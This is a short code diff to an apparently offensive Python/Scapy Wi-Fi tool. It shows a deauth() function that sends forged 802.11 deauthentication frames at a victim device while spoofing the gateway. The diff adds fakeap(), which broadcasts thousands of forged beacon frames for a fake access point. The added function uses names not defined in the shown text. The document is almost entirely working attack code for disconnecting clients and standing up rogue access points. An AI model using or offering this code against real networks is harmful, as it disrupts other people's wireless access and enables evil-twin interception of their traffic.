@@ -11,6 +11,10 @@ from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
 def deauth(macVictim, interface, gateway):
     packet = RadioTap() / Dot11(type=0, subtype=12, addr1=macVictim, addr2=gateway, addr3=gateway) / Dot11Deauth(reason=2)
     sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)
+    
+def fakeap():
+    packet = RadioTap() / Dot11(addr1 = broadcast, addr2 = bssid, addr3 = bssid) / Dot11Beacon(cap = 0x1104) / Dot11Elt(ID=0, info="ssid") / Dot11Elt(ID=1, info="\x82\x84\x8b\x96\x24\x30\x48\x6c") / Dot11Elt(ID=3, info="\x0b") / Dot11Elt(ID=5, info="\x00\x01\x00\x00")
+    sendp(packet, count = 10000, inter = 0.2)
 
 
 if __name__ == "__main__":
